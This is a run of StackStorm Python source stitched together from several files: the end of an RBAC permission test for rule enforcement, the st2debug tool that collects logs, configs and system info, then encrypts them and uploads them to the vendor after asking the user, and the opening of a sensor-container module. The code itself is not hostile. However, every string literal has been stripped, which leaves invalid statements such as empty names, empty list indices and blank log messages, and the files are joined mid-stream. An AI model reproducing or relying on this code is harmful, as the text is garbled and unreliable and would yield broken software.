permission_grants = permission_grants ) \n 
role_7_db = Role . add_or_update ( role_7_db ) \n 
self . roles [ ] = role_7_db \n 
\n 
# Custom role - "rule_create" grant on rule_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . RULE , \n 
permission_types = [ PermissionType . RULE_CREATE ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_8_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_8_db = Role . add_or_update ( role_8_db ) \n 
self . roles [ ] = role_8_db \n 
\n 
# Custom role - "rule_all" grant on rule_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . RULE , \n 
permission_types = [ PermissionType . RULE_ALL ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_9_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_9_db = Role . add_or_update ( role_9_db ) \n 
self . roles [ ] = role_9_db \n 
\n 
# Custom role - "rule_list" grant \n 
grant_db = PermissionGrantDB ( resource_uid = None , \n 
resource_type = None , \n 
permission_types = [ PermissionType . RULE_LIST ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_10_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_10_db = Role . add_or_update ( role_10_db ) \n 
self . roles [ ] = role_10_db \n 
\n 
# Create some mock role assignments \n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
~~ def test_user_has_permission ( self ) : \n 
~~~ resolver = RuleEnforcementPermissionsResolver ( ) \n 
\n 
# Admin user, should always return true \n 
user_db = self . users [ ] \n 
permission_type = PermissionType . RULE_ENFORCEMENT_LIST \n 
self . assertTrue ( resolver . user_has_permission ( user_db = user_db , \n 
permission_type = permission_type ) ) \n 
\n 
# Observer, should always return true for VIEW permissions \n 
user_db = self . users [ ] \n 
self . assertTrue ( resolver . user_has_permission ( user_db = user_db , \n 
permission_type = permission_type ) ) \n 
\n 
# No roles, should return false for everything \n 
user_db = self . users [ ] \n 
self . assertFalse ( resolver . user_has_permission ( user_db = user_db , \n 
permission_type = permission_type ) ) \n 
\n 
# Custom role with no permission grants, should return false for everything \n 
user_db = self . users [ ] \n 
self . assertFalse ( resolver . user_has_permission ( user_db = user_db , \n 
permission_type = permission_type ) ) \n 
\n 
# Custom role with "rule_list" grant \n 
user_db = self . users [ ] \n 
self . assertTrue ( resolver . user_has_permission ( user_db = user_db , \n 
permission_type = permission_type ) ) \n 
\n 
~~ def test_user_has_resource_db_permission ( self ) : \n 
~~~ resolver = RuleEnforcementPermissionsResolver ( ) \n 
all_permission_types = PermissionType . get_valid_permissions_for_resource_type ( \n 
ResourceType . RULE_ENFORCEMENT ) \n 
\n 
# Admin user, should always return true \n 
resource_db = self . resources [ ] \n 
user_db = self . users [ ] \n 
self . assertTrue ( self . _user_has_resource_db_permissions ( \n 
resolver = resolver , \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_types = all_permission_types ) ) \n 
\n 
# Observer, should always return true for VIEW permission \n 
user_db = self . users [ ] \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
\n 
# No roles, should return false for everything \n 
user_db = self . users [ ] \n 
self . assertFalse ( self . _user_has_resource_db_permissions ( \n 
resolver = resolver , \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_types = all_permission_types ) ) \n 
\n 
# Custom role with no permission grants, should return false for everything \n 
user_db = self . users [ ] \n 
self . assertFalse ( self . _user_has_resource_db_permissions ( \n 
resolver = resolver , \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_types = all_permission_types ) ) \n 
\n 
# Custom role with unrelated permission grant to parent pack \n 
user_db = self . users [ ] \n 
self . assertFalse ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
self . assertFalse ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
\n 
# Custom role with with grant on the parent pack \n 
user_db = self . users [ ] \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
\n 
# Custom role with a direct grant on rule \n 
user_db = self . users [ ] \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = self . resources [ ] , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
\n 
# Custom role - "rule_all" grant on the rule parent pack \n 
user_db = self . users [ ] \n 
resource_db = self . resources [ ] \n 
self . assertTrue ( self . _user_has_resource_db_permissions ( \n 
resolver = resolver , \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_types = all_permission_types ) ) \n 
\n 
# Custom role - "rule_all" grant on the rule \n 
user_db = self . users [ ] \n 
resource_db = self . resources [ ] \n 
self . assertTrue ( self . _user_has_resource_db_permissions ( \n 
resolver = resolver , \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_types = all_permission_types ) ) \n 
\n 
# Custom role - "rule_modify" grant on rule_1 \n 
user_db = self . users [ ] \n 
resource_db = self . resources [ ] \n 
\n 
# "modify" also grants "view" \n 
self . assertTrue ( resolver . user_has_resource_db_permission ( \n 
user_db = user_db , \n 
resource_db = resource_db , \n 
permission_type = PermissionType . RULE_ENFORCEMENT_VIEW ) ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ """\nThis script submits information which helps StackStorm employees debug different\nuser problems and issues to StackStorm.\n\nBy default the following information is included:\n\n- Logs from /var/log/st2\n- StackStorm and mistral config file (/etc/st2/st2.conf, /etc/mistral/mistral.conf)\n- All the content (integration packs).\n- Information about your system and StackStorm installation (Operating system,\n  Python version, StackStorm version, Mistral version)\n\nNote: This script currently assumes it\'s running on Linux.\n""" \n 
\n 
import os \n 
import sys \n 
import shutil \n 
import socket \n 
import logging \n 
import tarfile \n 
import argparse \n 
import platform \n 
import tempfile \n 
import httplib \n 
\n 
import six \n 
import yaml \n 
import gnupg \n 
import requests \n 
from distutils . spawn import find_executable \n 
\n 
import st2common \n 
from st2common . content . utils import get_packs_base_paths \n 
from st2common import __version__ as st2_version \n 
from st2common import config \n 
from st2common . util import date as date_utils \n 
from st2common . util . shell import run_command \n 
from st2debug . constants import GPG_KEY \n 
from st2debug . constants import GPG_KEY_FINGERPRINT \n 
from st2debug . constants import S3_BUCKET_URL \n 
from st2debug . constants import COMPANY_NAME \n 
from st2debug . constants import ARG_NAMES \n 
from st2debug . utils . fs import copy_files \n 
from st2debug . utils . fs import get_full_file_list \n 
from st2debug . utils . fs import get_dirs_in_path \n 
from st2debug . utils . fs import remove_file \n 
from st2debug . utils . system_info import get_cpu_info \n 
from st2debug . utils . system_info import get_memory_info \n 
from st2debug . utils . system_info import get_package_list \n 
from st2debug . utils . git_utils import get_repo_latest_revision_hash \n 
from st2debug . processors import process_st2_config \n 
from st2debug . processors import process_mistral_config \n 
from st2debug . processors import process_content_pack_dir \n 
\n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
# Constants \n 
GPG_INSTALLED = find_executable ( ) is not None \n 
\n 
LOG_FILE_PATHS = [ \n 
, \n 
\n 
] \n 
\n 
ST2_CONFIG_FILE_PATH = \n 
MISTRAL_CONFIG_FILE_PATH = \n 
\n 
SHELL_COMMANDS = [ ] \n 
\n 
# Directory structure inside tarball \n 
DIRECTORY_STRUCTURE = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
OUTPUT_PATHS = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: \n 
} \n 
\n 
# Options which should be removed from the st2 config \n 
ST2_CONF_OPTIONS_TO_REMOVE = { \n 
: [ , ] , \n 
: [ ] \n 
} \n 
\n 
REMOVE_VALUE_NAME = \n 
\n 
OUTPUT_FILENAME_TEMPLATE = \n 
\n 
DATE_FORMAT = \n 
\n 
try : \n 
~~~ config . parse_args ( args = [ ] ) \n 
~~ except Exception : \n 
~~~ pass \n 
\n 
\n 
~~ def setup_logging ( ) : \n 
~~~ root = LOG \n 
root . setLevel ( logging . INFO ) \n 
\n 
ch = logging . StreamHandler ( sys . stdout ) \n 
ch . setLevel ( logging . DEBUG ) \n 
formatter = logging . Formatter ( ) \n 
ch . setFormatter ( formatter ) \n 
root . addHandler ( ch ) \n 
\n 
\n 
~~ class DebugInfoCollector ( object ) : \n 
~~~ def __init__ ( self , include_logs , include_configs , include_content , include_system_info , \n 
include_shell_commands = False , user_info = None , debug = False , config_file = None , \n 
output_path = None ) : \n 
~~~ """\n        Initialize a DebugInfoCollector object.\n\n        :param include_logs: Include log files in generated archive.\n        :type include_logs: ``bool``\n        :param include_configs: Include config files in generated archive.\n        :type include_configs: ``bool``\n        :param include_content: Include pack contents in generated archive.\n        :type include_content: ``bool``\n        :param include_system_info: Include system information in generated archive.\n        :type include_system_info: ``bool``\n        :param include_shell_commands: Include shell command output in generated archive.\n        :type include_shell_commands: ``bool``\n        :param user_info: User info to be included in generated archive.\n        :type user_info: ``dict``\n        :param debug: Enable debug logging.\n        :type debug: ``bool``\n        :param config_file: Values from config file to override defaults.\n        :type config_file: ``dict``\n        :param output_path: Path to write output file to. (optional)\n        :type output_path: ``str``\n        """ \n 
self . include_logs = include_logs \n 
self . include_configs = include_configs \n 
self . include_content = include_content \n 
self . include_system_info = include_system_info \n 
self . include_shell_commands = include_shell_commands \n 
self . user_info = user_info \n 
self . debug = debug \n 
self . output_path = output_path \n 
\n 
config_file = config_file or { } \n 
self . st2_config_file_path = config_file . get ( , ST2_CONFIG_FILE_PATH ) \n 
self . mistral_config_file_path = config_file . get ( , \n 
MISTRAL_CONFIG_FILE_PATH ) \n 
self . log_file_paths = config_file . get ( , LOG_FILE_PATHS [ : ] ) \n 
self . gpg_key = config_file . get ( , GPG_KEY ) \n 
self . gpg_key_fingerprint = config_file . get ( , GPG_KEY_FINGERPRINT ) \n 
self . s3_bucket_url = config_file . get ( , S3_BUCKET_URL ) \n 
self . company_name = config_file . get ( , COMPANY_NAME ) \n 
self . shell_commands = config_file . get ( , SHELL_COMMANDS ) \n 
\n 
self . st2_config_file_name = os . path . basename ( self . st2_config_file_path ) \n 
self . mistral_config_file_name = os . path . basename ( self . mistral_config_file_path ) \n 
self . config_file_paths = [ \n 
self . st2_config_file_path , \n 
self . mistral_config_file_path \n 
] \n 
\n 
~~ def run ( self , encrypt = False , upload = False , existing_file = None ) : \n 
~~~ """\n        Run the specified steps.\n\n        :param encrypt: If true, encrypt the archive file.\n        :param encrypt: ``bool``\n        :param upload: If true, upload the resulting file.\n        :param upload: ``bool``\n        :param existing_file: Path to an existing archive file. If not specified a new\n        archive will be created.\n        :param existing_file: ``str``\n        """ \n 
temp_files = [ ] \n 
\n 
try : \n 
~~~ if existing_file : \n 
~~~ working_file = existing_file \n 
~~ else : \n 
\n 
~~~ working_file = self . create_archive ( ) \n 
if not encrypt and not upload : \n 
~~~ LOG . info ( \n 
% working_file ) \n 
~~ else : \n 
~~~ temp_files . append ( working_file ) \n 
\n 
~~ ~~ if encrypt : \n 
~~~ working_file = self . encrypt_archive ( archive_file_path = working_file ) \n 
if not upload : \n 
~~~ LOG . info ( % \n 
working_file ) \n 
~~ else : \n 
~~~ temp_files . append ( working_file ) \n 
\n 
~~ ~~ if upload : \n 
~~~ self . upload_archive ( archive_file_path = working_file ) \n 
tarball_name = os . path . basename ( working_file ) \n 
LOG . info ( % \n 
( self . company_name , tarball_name ) ) \n 
LOG . info ( \n 
% tarball_name ) \n 
~~ ~~ finally : \n 
# Remove temp files \n 
~~~ for temp_file in temp_files : \n 
~~~ assert temp_file . startswith ( ) \n 
remove_file ( file_path = temp_file ) \n 
\n 
~~ ~~ ~~ def create_archive ( self ) : \n 
~~~ """\n        Create an archive with debugging information.\n\n        :return: Path to the generated archive.\n        :rtype: ``str``\n        """ \n 
\n 
try : \n 
# 1. Create temporary directory with the final directory structure where we will move \n 
# files which will be processed and included in the tarball \n 
~~~ temp_dir_path = self . create_temp_directories ( ) \n 
\n 
# Prepend temp_dir_path to OUTPUT_PATHS \n 
output_paths = { } \n 
for key , path in OUTPUT_PATHS . iteritems ( ) : \n 
~~~ output_paths [ key ] = os . path . join ( temp_dir_path , path ) \n 
\n 
# 2. Moves all the files to the temporary directory \n 
~~ LOG . info ( ) \n 
if self . include_logs : \n 
~~~ self . collect_logs ( output_paths [ ] ) \n 
~~ if self . include_configs : \n 
~~~ self . collect_config_files ( output_paths [ ] ) \n 
~~ if self . include_content : \n 
~~~ self . collect_pack_content ( output_paths [ ] ) \n 
~~ if self . include_system_info : \n 
~~~ self . add_system_information ( output_paths [ ] ) \n 
~~ if self . user_info : \n 
~~~ self . add_user_info ( output_paths [ ] ) \n 
~~ if self . include_shell_commands : \n 
~~~ self . add_shell_command_output ( output_paths [ ] ) \n 
\n 
# 3. Create a tarball \n 
~~ return self . create_tarball ( temp_dir_path ) \n 
\n 
~~ except Exception as e : \n 
~~~ LOG . exception ( , exc_info = True ) \n 
raise e \n 
\n 
~~ ~~ def encrypt_archive ( self , archive_file_path ) : \n 
~~~ """\n        Encrypt archive with debugging information using our public key.\n\n        :param archive_file_path: Path to the non-encrypted tarball file.\n        :type archive_file_path: ``str``\n\n        :return: Path to the encrypted archive.\n        :rtype: ``str``\n        """ \n 
try : \n 
~~~ assert archive_file_path . endswith ( ) \n 
\n 
LOG . info ( ) \n 
gpg = gnupg . GPG ( verbose = self . debug ) \n 
\n 
# Import our public key \n 
import_result = gpg . import_keys ( self . gpg_key ) \n 
# pylint: disable=no-member \n 
assert import_result . count == 1 \n 
\n 
encrypted_archive_output_file_name = os . path . basename ( archive_file_path ) + \n 
encrypted_archive_output_file_path = os . path . join ( , \n 
encrypted_archive_output_file_name ) \n 
with open ( archive_file_path , ) as fp : \n 
~~~ gpg . encrypt_file ( file = fp , \n 
recipients = self . gpg_key_fingerprint , \n 
always_trust = True , \n 
output = encrypted_archive_output_file_path ) \n 
~~ return encrypted_archive_output_file_path \n 
~~ except Exception as e : \n 
~~~ LOG . exception ( , exc_info = True ) \n 
raise e \n 
\n 
~~ ~~ def upload_archive ( self , archive_file_path ) : \n 
~~~ """\n        Upload the encrypted archive.\n\n        :param archive_file_path: Path to the encrypted tarball file.\n        :type archive_file_path: ``str``\n        """ \n 
try : \n 
~~~ assert archive_file_path . endswith ( ) \n 
\n 
LOG . debug ( ) \n 
file_name = os . path . basename ( archive_file_path ) \n 
url = self . s3_bucket_url + file_name \n 
assert url . startswith ( ) \n 
\n 
with open ( archive_file_path , ) as fp : \n 
~~~ response = requests . put ( url = url , files = { : fp } ) \n 
~~ assert response . status_code == httplib . OK \n 
~~ except Exception as e : \n 
~~~ LOG . exception ( % self . company_name , exc_info = True ) \n 
raise e \n 
\n 
~~ ~~ def collect_logs ( self , output_path ) : \n 
~~~ """\n        Copy log files to the output path.\n\n        :param output_path: Path where log files will be copied to.\n        :type output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
for file_path_glob in self . log_file_paths : \n 
~~~ log_file_list = get_full_file_list ( file_path_glob = file_path_glob ) \n 
copy_files ( file_paths = log_file_list , destination = output_path ) \n 
\n 
~~ ~~ def collect_config_files ( self , output_path ) : \n 
~~~ """\n        Copy config files to the output path.\n\n        :param output_path: Path where config files will be copied to.\n        :type output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
copy_files ( file_paths = self . config_file_paths , destination = output_path ) \n 
\n 
st2_config_path = os . path . join ( output_path , self . st2_config_file_name ) \n 
process_st2_config ( config_path = st2_config_path ) \n 
\n 
mistral_config_path = os . path . join ( output_path , self . mistral_config_file_name ) \n 
process_mistral_config ( config_path = mistral_config_path ) \n 
\n 
~~ @ staticmethod \n 
def collect_pack_content ( output_path ) : \n 
~~~ """\n        Copy pack contents to the output path.\n\n        :param output_path: Path where pack contents will be copied to.\n        :type output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
\n 
packs_base_paths = get_packs_base_paths ( ) \n 
for index , packs_base_path in enumerate ( packs_base_paths , 1 ) : \n 
~~~ dst = os . path . join ( output_path , % index ) \n 
\n 
try : \n 
~~~ shutil . copytree ( src = packs_base_path , dst = dst ) \n 
~~ except IOError : \n 
~~~ continue \n 
\n 
~~ ~~ base_pack_dirs = get_dirs_in_path ( file_path = output_path ) \n 
\n 
for base_pack_dir in base_pack_dirs : \n 
~~~ pack_dirs = get_dirs_in_path ( file_path = base_pack_dir ) \n 
\n 
for pack_dir in pack_dirs : \n 
~~~ process_content_pack_dir ( pack_dir = pack_dir ) \n 
\n 
~~ ~~ ~~ def add_system_information ( self , output_path ) : \n 
~~~ """\n        Collect and write system information to output path.\n\n        :param output_path: Path where system information will be written to.\n        :type output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
\n 
system_information = yaml . dump ( self . get_system_information ( ) , \n 
default_flow_style = False ) \n 
\n 
with open ( output_path , ) as fp : \n 
~~~ fp . write ( system_information ) \n 
\n 
~~ ~~ def add_user_info ( self , output_path ) : \n 
~~~ """\n        Write user info to output path as YAML.\n\n        :param output_path: Path where user info will be written.\n        :type output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
user_info = yaml . dump ( self . user_info , default_flow_style = False ) \n 
\n 
with open ( output_path , ) as fp : \n 
~~~ fp . write ( user_info ) \n 
\n 
~~ ~~ def add_shell_command_output ( self , output_path ) : \n 
~~~ """"\n        Get output of the required shell command and redirect the output to output path.\n\n        :param output_path: Directory where output files will be written\n        :param output_path: ``str``\n        """ \n 
LOG . debug ( ) \n 
for cmd in self . shell_commands : \n 
~~~ output_file = os . path . join ( output_path , % self . format_output_filename ( cmd ) ) \n 
exit_code , stdout , stderr = run_command ( cmd = cmd , shell = True ) \n 
with open ( output_file , ) as fp : \n 
~~~ fp . write ( ) \n 
fp . write ( stdout ) \n 
fp . write ( ) \n 
fp . write ( ) \n 
fp . write ( stderr ) \n 
fp . write ( ) \n 
\n 
~~ ~~ ~~ def create_tarball ( self , temp_dir_path ) : \n 
~~~ """\n        Create tarball with the contents of temp_dir_path.\n\n        Tarball will be written to self.output_path, if set. Otherwise it will\n        be written to /tmp a name generated according to OUTPUT_FILENAME_TEMPLATE.\n\n        :param temp_dir_path: Base directory to include in tarbal.\n        :type temp_dir_path: ``str``\n\n        :return: Path to the created tarball.\n        :rtype: ``str``\n        """ \n 
LOG . info ( ) \n 
if self . output_path : \n 
~~~ output_file_path = self . output_path \n 
~~ else : \n 
~~~ date = date_utils . get_datetime_utc_now ( ) . strftime ( DATE_FORMAT ) \n 
values = { : socket . gethostname ( ) , : date } \n 
\n 
output_file_name = OUTPUT_FILENAME_TEMPLATE % values \n 
output_file_path = os . path . join ( , output_file_name ) \n 
\n 
~~ with tarfile . open ( output_file_path , ) as tar : \n 
~~~ tar . add ( temp_dir_path , arcname = ) \n 
\n 
~~ return output_file_path \n 
\n 
~~ @ staticmethod \n 
def create_temp_directories ( ) : \n 
~~~ """\n        Creates a new temp directory and creates the directory structure as defined\n        by DIRECTORY_STRUCTURE.\n\n        :return: Path to temp directory.\n        :rtype: ``str``\n        """ \n 
temp_dir_path = tempfile . mkdtemp ( ) \n 
\n 
for directory_name in DIRECTORY_STRUCTURE : \n 
~~~ full_path = os . path . join ( temp_dir_path , directory_name ) \n 
os . mkdir ( full_path ) \n 
\n 
~~ return temp_dir_path \n 
\n 
~~ @ staticmethod \n 
def format_output_filename ( cmd ) : \n 
~~~ """"\n        Remove whitespace and special characters from a shell command.\n\n        Used to create filename-safe representations of a shell command.\n\n        :param cmd: Shell command.\n        :type cmd: ``str``\n        :return: Formatted filename.\n        :rtype: ``str``\n        """ \n 
return cmd . translate ( None , """ !@#$%^&*()[]{};:,./<>?\\|`~=+"\'""" ) \n 
\n 
~~ @ staticmethod \n 
def get_system_information ( ) : \n 
~~~ """\n        Retrieve system information which is included in the report.\n\n        :rtype: ``dict``\n        """ \n 
system_information = { \n 
: socket . gethostname ( ) , \n 
: { } , \n 
: { \n 
: { } , \n 
: { } \n 
} , \n 
: { } , \n 
: { } , \n 
: { } \n 
} \n 
\n 
# Operating system information \n 
system_information [ ] [ ] = platform . system ( ) \n 
system_information [ ] [ ] = platform . release ( ) \n 
system_information [ ] [ ] = platform . platform ( ) \n 
system_information [ ] [ ] = platform . system ( ) \n 
system_information [ ] [ ] = . join ( platform . architecture ( ) ) \n 
\n 
if platform . system ( ) . lower ( ) == : \n 
~~~ distribution = . join ( platform . linux_distribution ( ) ) \n 
system_information [ ] [ ] = distribution \n 
\n 
~~ system_information [ ] [ ] = sys . version . split ( ) [ 0 ] \n 
\n 
# Hardware information \n 
cpu_info = get_cpu_info ( ) \n 
\n 
if cpu_info : \n 
~~~ core_count = len ( cpu_info ) \n 
model = cpu_info [ 0 ] [ ] \n 
system_information [ ] [ ] = { \n 
: core_count , \n 
: model \n 
} \n 
~~ else : \n 
# Unsupported platform \n 
~~~ system_information [ ] [ ] = \n 
\n 
~~ memory_info = get_memory_info ( ) \n 
\n 
if memory_info : \n 
~~~ total = memory_info [ ] / 1024 \n 
free = memory_info [ ] / 1024 \n 
used = ( total - free ) \n 
system_information [ ] [ ] = { \n 
: total , \n 
: used , \n 
: free \n 
} \n 
~~ else : \n 
# Unsupported platform \n 
~~~ system_information [ ] [ ] = \n 
\n 
# StackStorm information \n 
~~ system_information [ ] [ ] = st2_version \n 
\n 
st2common_path = st2common . __file__ \n 
st2common_path = os . path . dirname ( st2common_path ) \n 
\n 
if in st2common_path : \n 
# Assume we are running source install \n 
~~~ base_install_path = st2common_path . replace ( , ) \n 
\n 
revision_hash = get_repo_latest_revision_hash ( repo_path = base_install_path ) \n 
\n 
system_information [ ] [ ] = \n 
system_information [ ] [ ] = revision_hash \n 
~~ else : \n 
~~~ package_list = get_package_list ( name_startswith = ) \n 
\n 
system_information [ ] [ ] = \n 
system_information [ ] [ ] = package_list \n 
\n 
# Mistral information \n 
~~ repo_path = \n 
revision_hash = get_repo_latest_revision_hash ( repo_path = repo_path ) \n 
system_information [ ] [ ] = \n 
system_information [ ] [ ] = revision_hash \n 
\n 
return system_information \n 
\n 
\n 
~~ ~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( description = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = \'Run in non-interactive mode and answer "yes" to all the questions\' ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = False , \n 
help = ) \n 
parser . add_argument ( , action = , default = None , \n 
help = ) \n 
parser . add_argument ( , action = , default = None , \n 
help = ) \n 
parser . add_argument ( , action = , default = None , \n 
help = ) \n 
args = parser . parse_args ( ) \n 
\n 
setup_logging ( ) \n 
\n 
# Ensure that not all options have been excluded \n 
abort = True \n 
for arg_name in ARG_NAMES : \n 
~~~ abort &= getattr ( args , arg_name , False ) \n 
\n 
~~ if abort : \n 
~~~ print ( ) \n 
sys . exit ( 2 ) \n 
\n 
# Get setting overrides from yaml file if specified \n 
~~ if args . config : \n 
~~~ try : \n 
~~~ with open ( args . config , ) as yaml_file : \n 
~~~ config_file = yaml . safe_load ( yaml_file ) \n 
~~ ~~ except Exception as e : \n 
~~~ LOG . error ( % e ) \n 
sys . exit ( 1 ) \n 
\n 
~~ if not isinstance ( config_file , dict ) : \n 
~~~ LOG . error ( ) \n 
sys . exit ( 1 ) \n 
~~ ~~ else : \n 
~~~ config_file = { } \n 
\n 
~~ company_name = config_file . get ( , COMPANY_NAME ) \n 
\n 
# Defaults \n 
encrypt = True \n 
upload = True \n 
\n 
if args . review : \n 
~~~ encrypt = False \n 
upload = False \n 
\n 
~~ if encrypt : \n 
# When not running in review mode, GPG needs to be installed and \n 
# available \n 
~~~ if not GPG_INSTALLED : \n 
~~~ msg = ( \'"gpg" binary not found, can\\\'t proceed. Make sure "gpg" is installed \' \n 
) \n 
raise ValueError ( msg ) \n 
\n 
~~ ~~ if not args . yes and not args . existing_file and upload : \n 
~~~ submitted_content = [ name . replace ( , ) for name in ARG_NAMES if \n 
not getattr ( args , name , False ) ] \n 
submitted_content = . join ( submitted_content ) \n 
print ( % ( company_name , \n 
submitted_content ) ) \n 
value = six . moves . input ( ) \n 
if value . strip ( ) . lower ( ) not in [ , ] : \n 
~~~ print ( ) \n 
sys . exit ( 1 ) \n 
\n 
# Prompt user for optional additional context info \n 
~~ ~~ user_info = { } \n 
if not args . yes and not args . existing_file : \n 
~~~ print ( \n 
) \n 
value = six . moves . input ( ) \n 
if value . strip ( ) . lower ( ) in [ , ] : \n 
~~~ user_info [ ] = six . moves . input ( ) \n 
user_info [ ] = six . moves . input ( ) \n 
user_info [ ] = six . moves . input ( ) \n 
\n 
~~ ~~ debug_collector = DebugInfoCollector ( include_logs = not args . exclude_logs , \n 
include_configs = not args . exclude_configs , \n 
include_content = not args . exclude_content , \n 
include_system_info = not args . exclude_system_info , \n 
include_shell_commands = not args . exclude_shell_commands , \n 
user_info = user_info , \n 
debug = args . debug , \n 
config_file = config_file , \n 
output_path = args . output ) \n 
\n 
debug_collector . run ( encrypt = encrypt , upload = upload , existing_file = args . existing_file ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import os \n 
import sys \n 
import signal \n 
\n 
import eventlet \n 
\n 
from st2common import log as logging \n 
from st2reactor . container . process_container import ProcessSensorContainer \n 
from st2common . services . sensor_watcher import SensorWatcher \n 
from st2common . models . system . common import ResourceReference \n 
\n 
LOG = logging . getLogger ( __name__ ) \n 
